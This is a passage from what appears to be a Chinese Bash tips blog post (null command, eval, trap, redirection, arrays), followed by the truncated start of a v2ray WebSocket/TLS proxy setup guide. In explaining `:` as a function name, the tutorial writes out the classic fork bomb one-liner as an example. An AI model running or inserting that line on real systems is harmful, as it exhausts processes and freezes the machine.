<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ bash -x test.sh <br>+ sum=<br>+ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..5&#125;<br>+ (( i%2==0 ))<br>+ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..5&#125;<br>+ (( i%2==0 ))<br>+ : 2<br>+ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..5&#125;<br>+ (( i%2==0 ))<br>+ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..5&#125;<br>+ (( i%2==0 ))<br>+ : 6<br>+ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..5&#125;<br>+ (( i%2==0 ))<br>+ <span class="hljs-built_in">echo</span> 6<br>6<br></code></pre></div></td></tr></table></figure>
<p>或者<code>set -x</code>打开跟踪模式、<code>set +x</code>关闭跟踪模式</p>
<h3 id="空命令"><a class="markdownIt-Anchor" href="#空命令"></a> 空命令 :</h3>
<p>前面有谈到过<code>:</code>这个命令，它就像Python的<code>pass</code>，类似占位符，什么都不做。有时可以用<code>:</code>在if/for/while/until/case内执行一些赋值操作</p>
<h3 id="命令"><a class="markdownIt-Anchor" href="#命令"></a> .命令</h3>
<p><code>. file</code>会使Shell<strong>读取并执行</strong>指定的文件，file不一定是可执行的，只有可读就行。</p>
<h4 id="参数扩展"><a class="markdownIt-Anchor" href="#参数扩展"></a> 参数扩展</h4>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">var=100<br>var=$((var*<span class="hljs-number">100</span>))        <span class="hljs-comment"># 10000</span><br>: $((var*=<span class="hljs-number">100</span>))         <span class="hljs-comment"># 1000000</span><br></code></pre></div></td></tr></table></figure>
<h4 id="占位符-注释"><a class="markdownIt-Anchor" href="#占位符-注释"></a> 占位符、注释</h4>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">: hello linux<br><span class="hljs-keyword">if</span> [ 10 -ge 5 ];<span class="hljs-keyword">then</span> : ;<span class="hljs-keyword">else</span> :; <span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure>
<h4 id="函数名"><a class="markdownIt-Anchor" href="#函数名"></a> 函数名</h4>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">:() <br>&#123; <br>        <span class="hljs-built_in">echo</span> xx; <br>&#125;<br>:<br></code></pre></div></td></tr></table></figure>
<p>比如众所周知的fork bomb <code>:()&#123; :|:&amp; &#125;;:</code> 就是如此简单粗暴</p>
<h3 id="循环"><a class="markdownIt-Anchor" href="#循环"></a> 循环</h3>
<h4 id="跳过跳出循环"><a class="markdownIt-Anchor" href="#跳过跳出循环"></a> 跳过/跳出循环</h4>
<p><code>continue n</code>或<code>break n</code>来跳过或跳出第n层循环</p>
<h4 id="后台执行循环"><a class="markdownIt-Anchor" href="#后台执行循环"></a> 后台执行循环</h4>
<p>在循环关闭语句done后面加上<code>&amp;</code>能够使循环for/while后台执行</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 1 2 3;<span class="hljs-keyword">do</span><br>        sleep 2<br><span class="hljs-keyword">done</span> &amp;<br></code></pre></div></td></tr></table></figure>
<h4 id="循环上的io重定向"><a class="markdownIt-Anchor" href="#循环上的io重定向"></a> 循环上的IO重定向</h4>
<p>输出重定向</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(ls <span class="hljs-variable">$HOME</span>);<span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;=&gt; _<span class="hljs-variable">$&#123;i&#125;</span>_&quot;</span><br><span class="hljs-keyword">done</span> &gt; output 2&gt;&amp;1<br></code></pre></div></td></tr></table></figure>
<p>输入重定向</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line;<span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;=&gt; <span class="hljs-variable">$line</span>&quot;</span><br><span class="hljs-keyword">done</span> &lt; file.txt<br></code></pre></div></td></tr></table></figure>
<h3 id="printf"><a class="markdownIt-Anchor" href="#printf"></a> printf</h3>
<p>对于简单的信息echo足矣，但是有时候需要格式化输出信息，那么linux提供了一个类似C的printf命令来帮助完成格式化，更多内容可以去查看帮助文档😹</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%.4f %s %d\n&quot;</span> 10.22 $(uname -r) 100     <span class="hljs-comment"># 10.2200 5.4.34-1-MANJARO 100</span><br></code></pre></div></td></tr></table></figure>
<h3 id="exec"><a class="markdownIt-Anchor" href="#exec"></a> exec</h3>
<p>exec除了会用新程序<strong>替换</strong>现有的程序，还有一下功能</p>
<h4 id="重定向标准输入"><a class="markdownIt-Anchor" href="#重定向标准输入"></a> 重定向标准输入</h4>
<p><code>exec &lt; infile</code></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">exec</span> &lt; infile<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> l;<span class="hljs-keyword">do</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;=&gt; <span class="hljs-variable">$l</span>&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></div></td></tr></table></figure>
<h4 id="重定向标准输出"><a class="markdownIt-Anchor" href="#重定向标准输出"></a> 重定向标准输出</h4>
<p><code>exec &gt; outfile</code></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">exec</span> &gt; outfile<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(ls);<span class="hljs-keyword">do</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;=&gt; <span class="hljs-variable">$i</span>&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></div></td></tr></table></figure>
<h4 id="重置标准输入输出"><a class="markdownIt-Anchor" href="#重置标准输入输出"></a> 重置标准输入/输出</h4>
<ul>
<li><code>exec &gt; /dev/tty</code></li>
<li><code>exec &lt; /dev/tty</code></li>
</ul>
<h3 id="命令组"><a class="markdownIt-Anchor" href="#命令组"></a> 命令组( … )、{ …; }</h3>
<p><code>( ... )</code>内的命令会在<strong>子shell</strong>执行，而<code>&#123; ...; &#125;</code>内的命令则是在<strong>当前shell</strong>执行。<br />
要注意，<code>&#123; ...; &#125;</code>的左<code>&#123;</code>后需要空格！</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">var=100<br>(var=200)<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$var</span>       <span class="hljs-comment"># 100</span><br><br>var=100<br>&#123; var=200;&#125;<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$var</span>       <span class="hljs-comment"># 200</span><br>&#123; var+=300;&#125;<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$var</span>       <span class="hljs-comment"># 200300</span><br></code></pre></div></td></tr></table></figure>
<p>其实<code>&#123; ...;&#125;</code>就像一个无名函数的调用…</p>
<h3 id="只读变量"><a class="markdownIt-Anchor" href="#只读变量"></a> 只读变量</h3>
<p>readonly和<code>declare</code>命令可以指定某个变量只读。<br />
<code>readonly var</code>或<code>declare -r var</code></p>
<h3 id="eval"><a class="markdownIt-Anchor" href="#eval"></a> eval</h3>
<p>把eval放在命令行之前，Shell会对该命令行进行二次扫描，然后执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pipe=<span class="hljs-string">&quot;|&quot;</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$pipe</span> wc -l        <br></code></pre></div></td></tr></table></figure>
<p>Shell第一次扫描时把<code>pipe</code>变量替换为<code>|</code>，然后eval使得Shell重新扫描命令行，此时Shell能够识别出<code>|</code>是一个管道符号，因此便能成功执行该命令行<br />
与eval搭配的字符有<code>;</code>、<code>|</code>、<code>&amp;</code>、<code>&lt;</code>、<code>&gt;</code>、<code>引号' &quot;</code></p>
<p>下面是一个典型的例子，展示了shell中所谓的“指针”</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">x=100<br>ptrx=x<br><span class="hljs-built_in">eval</span> <span class="hljs-built_in">echo</span> \$<span class="hljs-variable">$ptrx</span>       <span class="hljs-comment"># 100</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$ptrx</span>=50<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$x</span>                 <span class="hljs-comment"># 50</span><br></code></pre></div></td></tr></table></figure>
<h3 id="trap"><a class="markdownIt-Anchor" href="#trap"></a> trap</h3>
<p>trap用于信号处理，一般格式 <code>trap commands signals</code><br />
一些信号列表如下</p>
<table>
<thead>
<tr>
<th>信号</th>
<th>信号名称</th>
<th>产生原因</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>EXIT</td>
<td>退出SHELL</td>
</tr>
<tr>
<td>1</td>
<td>HUP</td>
<td>挂起</td>
</tr>
<tr>
<td>2</td>
<td>INT</td>
<td>中断</td>
</tr>
<tr>
<td>3</td>
<td>QUIT</td>
<td>退出</td>
</tr>
<tr>
<td>6</td>
<td>ABRT</td>
<td>中止</td>
</tr>
<tr>
<td>9</td>
<td>KILL</td>
<td>&quot;销毁&quot;进程</td>
</tr>
<tr>
<td>14</td>
<td>ALAM</td>
<td>超时</td>
</tr>
<tr>
<td>15</td>
<td>TERM</td>
<td>软件终止信号</td>
</tr>
</tbody>
</table>
<p>没有参数的<code>trap</code>会显示定义过或修改过的所有trap处理程序</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">trap</span> <span class="hljs-string">&quot;echo bye&quot;</span> INT<br><span class="hljs-built_in">trap</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 1 2 3  ;<span class="hljs-keyword">do</span><br>        sleep 1<br>        <span class="hljs-built_in">echo</span> ...<br><span class="hljs-keyword">done</span><br></code></pre></div></td></tr></table></figure>
<p><code>trap &quot;&quot; SIGINT</code> 忽略SIGINT信号，这也会导致所有的子shell也忽略这个信号(无论子shell是否有自己的trap信号处理程序)<br />
<code>trap : SIGINT</code> 当前shell什么也不做，子shell执行默认的信号处理程序(如果有的话)<br />
<code>trap SIGINT</code> 重置中断信号处理<br />
一、</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ <span class="hljs-built_in">trap</span> <span class="hljs-string">&quot;&quot;</span> SIGINT<br>$ bash test.sh <br><span class="hljs-built_in">trap</span> -- <span class="hljs-string">&#x27;&#x27;</span> SIGINT<br>...<br>^C...<br>...<br></code></pre></div></td></tr></table></figure>
<p>二、</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ <span class="hljs-built_in">trap</span> : SIGINT<br>$ bash test.sh <br><span class="hljs-built_in">trap</span> -- <span class="hljs-string">&#x27;echo bye&#x27;</span> SIGINT<br>...<br>^Cbye<br>...<br></code></pre></div></td></tr></table></figure>
<h3 id="io重定向"><a class="markdownIt-Anchor" href="#io重定向"></a> IO重定向</h3>
<p>下表展示了重定向的一些操作(从左到右处理重定向)</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>&lt;</td>
<td>stdin重定向</td>
</tr>
<tr>
<td>&gt;</td>
<td>stdout重定向</td>
</tr>
<tr>
<td>2&gt;</td>
<td>stderr重定向</td>
</tr>
<tr>
<td>&gt;&amp;2</td>
<td>stdout重定向到stderr</td>
</tr>
<tr>
<td>&gt; file 2&gt;&amp;1</td>
<td>stdout和stderr重定向到file，等价于 &gt;file 2&gt;&gt;file</td>
</tr>
<tr>
<td>&gt;&amp;-</td>
<td>关闭stdout,stderr，如 exec 1&gt;&amp;-、exec 2&gt;&amp;-</td>
</tr>
<tr>
<td>&lt;&amp;-</td>
<td>关闭stdin，如 exec 0&lt;&amp;-</td>
</tr>
</tbody>
</table>
<p>比如常见的 <code>commands &gt;/dev/null 2&gt;&amp;1</code></p>
<h3 id="行内输入重定向-here-documents"><a class="markdownIt-Anchor" href="#行内输入重定向-here-documents"></a> 行内输入重定向 here documents</h3>
<p>主要有以下几种形式</p>
<ul>
<li><code>&lt;&lt;EOF</code>  忽略特殊字符</li>
<li><code>&lt;&lt;\EOF</code> 不忽略特殊字符，也就是原封不动的输出输入的内容</li>
<li><code>&lt;&lt;-EOF</code> 删除输入内容中的前导制表符</li>
<li><code>&lt;&lt;EOF&gt;&gt;</code> 如 <code>cat &lt;&lt;EOF&gt;&gt;outfile</code></li>
<li><code>&lt;&lt;EOF|tee</code> 如 <code>cat &lt;&lt;EOF|tee outfile</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ cat &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&gt; Hello</span><br><span class="hljs-string">&gt; $SHELL</span><br><span class="hljs-string">&gt; `uname -r`</span><br><span class="hljs-string">&gt; EOF</span><br>Hello<br>/usr/bin/zsh<br>5.4.34-1-MANJARO<br></code></pre></div></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ cat &lt;&lt;\EOF<br>&gt; Hello<br>&gt; <span class="hljs-variable">$SHELL</span><br>&gt; `uname -r`<br>&gt; EOF<br>Hello<br><span class="hljs-variable">$SHELL</span><br>`uname -r`<br></code></pre></div></td></tr></table></figure>
<h3 id="删除变量和函数"><a class="markdownIt-Anchor" href="#删除变量和函数"></a> 删除变量和函数</h3>
<p><code>unset var</code><br />
<code>unset -f func</code></p>
<h3 id="退出函数"><a class="markdownIt-Anchor" href="#退出函数"></a> 退出函数</h3>
<p><code>return n</code> n为函数返回状态，可以用<code>$?</code>捕获</p>
<h3 id="局部变量"><a class="markdownIt-Anchor" href="#局部变量"></a> 局部变量</h3>
<p>使用<code>typeset</code>或<code>local</code>定义局部变量，其中<code>local</code>只能用在<strong>函数</strong>中。<br />
同时<code>typeset</code>还可以定义整数类型的变量<code>-i</code>，若赋值的不是一个整数，那么可能会提示错误</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">typeset</span> -i i=100 j=200<br><span class="hljs-function"><span class="hljs-title">func</span></span>()&#123;<br>        <span class="hljs-built_in">local</span> k=300<br>        <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> <span class="hljs-variable">$j</span> <span class="hljs-variable">$k</span>   <span class="hljs-comment"># 100 200 300</span><br>&#125;<br>func<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> <span class="hljs-variable">$j</span> <span class="hljs-variable">$k</span>           <span class="hljs-comment"># 100 200</span><br><br><span class="hljs-built_in">typeset</span> -i n=100<br>n=100*200<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$n</span>                 <span class="hljs-comment"># 20000</span><br><span class="hljs-built_in">typeset</span> var=100<br>var=100*200<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$var</span>               <span class="hljs-comment"># 100*200</span><br></code></pre></div></td></tr></table></figure>
<h3 id="数组"><a class="markdownIt-Anchor" href="#数组"></a> 数组</h3>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">arr[0]=<span class="hljs-string">&quot;wtf&quot;</span><br>arr[1]=100<br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$arr</span>[1]            <span class="hljs-comment"># wtf[1]  </span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;arr[1]&#125;</span>          <span class="hljs-comment"># 100  </span><br><span class="hljs-comment"># 数组所有元素</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;arr[*]&#125;</span>          <span class="hljs-comment"># wtf 100</span><br><span class="hljs-comment"># 数组元素数量</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;#arr[*]&#125;</span>         <span class="hljs-comment"># 2</span><br><br><span class="hljs-comment"># 整数数组</span><br><span class="hljs-built_in">typeset</span> -i array<br>array[0]=100<br>array[1]=200<br>((array[2]=array[0]+array[1]))<br>array[3]=array[0]+array[1] <span class="hljs-comment"># 只有整数数组才行</span><br>: $((array[<span class="hljs-number">4</span>]=array[<span class="hljs-number">0</span>]+array[<span class="hljs-number">1</span>]))<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;array[*]&#125;</span>        <span class="hljs-comment"># 100 200 300 300 300</span><br></code></pre></div></td></tr></table></figure>
<h3 id="生成伪随机数"><a class="markdownIt-Anchor" href="#生成伪随机数"></a> 生成伪随机数</h3>
<blockquote>
<p>/dev/random在类UNIX系统中是一个特殊的设备文件，可以用作随机数发生器或伪随机数发生器。</p>
<p>/dev/random的一个副本是 /dev/urandom（“unblocked”，非阻塞的随机数发生器），它会重复使用熵池中的数据以产生伪随机数据。这表示对/dev/urandom的读取操作不会产生阻塞，但其输出的熵可能小于/dev/random的。它可以作为生成较低强度密码的伪随机数生成器，不建议用于生成高强度长期密码。</p>
</blockquote>
<p>详细信息维基百科<a href="https://zh.wikipedia.org/wiki//dev/random">/dev/random</a></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 生成16位包含A-Z、a-z的随机数</span><br>head /dev/urandom |tr -dc <span class="hljs-string">&#x27;A-Za-z&#x27;</span>|head -c 16<br><span class="hljs-comment"># 生成32位包含a-z、0-9的随机数</span><br>head /dev/urandom |tr -dc <span class="hljs-string">&#x27;0-9a-z&#x27;</span>|head -c 32<br></code></pre></div></td></tr></table></figure>
<h3 id="限制文件列宽-fold"><a class="markdownIt-Anchor" href="#限制文件列宽-fold"></a> 限制文件列宽 fold</h3>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 每行20列 </span><br>fold -w 20 test.file<br></code></pre></div></td></tr></table></figure>
<h3 id="判断命令是否存在"><a class="markdownIt-Anchor" href="#判断命令是否存在"></a> 判断命令是否存在</h3>
<p>可以用于判断linux命令是否存在的方法很多，比如 which、type、hash、command</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> -V ps &gt; /dev/null 2&gt;&amp;1<br><span class="hljs-keyword">if</span> [ $? -eq 0 ];<span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> OK;<span class="hljs-keyword">else</span> <span class="hljs-built_in">echo</span> NO;<span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>大概就这样吧…👴💔<br />
以后在补充补充🍑</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>v2ray ws tls</title>
    <url>/v2ray-ws-tls/</url>
    <content><![CDATA[<p>无</p>
<span id="more"></span>
<h3 id="centosubuntu"><a class="markdownIt-Anchor" href="#centosubuntu"></a> CentOS/Ubuntu</h3>
<p>若是CentOS，则可从EPEL仓库中安装 Nginx</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">yum install epel-release<br>yum install nginx<br></code></pre></div></td></tr></table></figure>
<h3 id="cloudflarenamecheapfreenom"><a class="markdownIt-Anchor" href="#cloudflarenamecheapfreenom"></a> Cloudflare+namecheap/Freenom</h3>
<p>在namecheap或Freenom上注册一个域名，然后修改域名的DNS为cloudflare分配的新的DNS</p>
<img src="/uploads/images/v2ray_ws_tls/01.png" style="zoom:67%;" />
<p>到 <a href="https://dash.cloudflare.com/profile/api-tokens">https://dash.cloudflare.com/profile/api-tokens</a> 创建一个Token。如下</p>
<img src="/uploads/images/v2ray_ws_tls/02.png" style="zoom:67%;" />
<p>注意，SSL/TLS 还需要设置为 <code>Full</code>或<code>Full (strict)</code></p>
<h3 id="nginx"><a class="markdownIt-Anchor" href="#nginx"></a> Nginx</h3>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cat &lt;&lt;<span class="hljs-string">EOF&gt;/etc/nginx/conf.d/default.conf</span><br><span class="hljs-string">server &#123;</span><br><span class="hljs-string">    listen       443 ssl;</span><br><span class="hljs-string">    server_name  $&#123;DOMAIN&#125;;</span><br><span class="hljs-string">    ssl_certificate ssl/$&#123;DOMAIN&#125;.crt;       </span><br><span class="hljs-string">    ssl_certificate_key ssl/$&#123;DOMAIN&#125;.key;   </span><br><span class="hljs-string"> </span><br><span class="hljs-string">    location /ws &#123;                         </span><br><span class="hljs-string">        proxy_redirect off;</span><br><span class="hljs-string">        proxy_pass http://127.0.0.1:10086;       </span><br><span class="hljs-string">        proxy_http_version 1.1;</span><br><span class="hljs-string">        proxy_set_header Upgrade \$http_upgrade;</span><br><span class="hljs-string">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="hljs-string">        proxy_set_header Host \$http_host;</span><br><span class="hljs-string">        proxy_set_header X-Real-IP \$remote_addr;</span><br><span class="hljs-string">        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;</span><br><span class="hljs-string">        proxy_connect_timeout 60s;</span><br><span class="hljs-string">        proxy_read_timeout 86400s;</span><br><span class="hljs-string">        proxy_send_timeout 60s;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></div></td></tr></table></figure>
<h3 id="v2ray"><a class="markdownIt-Anchor" href="#v2ray"></a> v2ray</h3>
<h4 id="server"><a class="markdownIt-Anchor" href="#server"></a> Server</h4>
<p>编辑 <code>/etc/v2ray/config.json</code> 添加以下内容。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<br>  <span class="hljs-string">&quot;inbounds&quot;</span>: [&#123;<br>    <span class="hljs-string">&quot;port&quot;</span>: 10086,           <br>    <span class="hljs-string">&quot;listen&quot;</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>    <span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;vmess&quot;</span>,<br>    <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;clients&quot;</span>: [<br>        &#123;<br>          <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;UUID&#125;</span>&quot;</span>, <br>          <span class="hljs-string">&quot;level&quot;</span>: 1,<br>          <span class="hljs-string">&quot;alterId&quot;</span>: 64      <br>        &#125;<br>      ]<br>    &#125;,<br>    <span 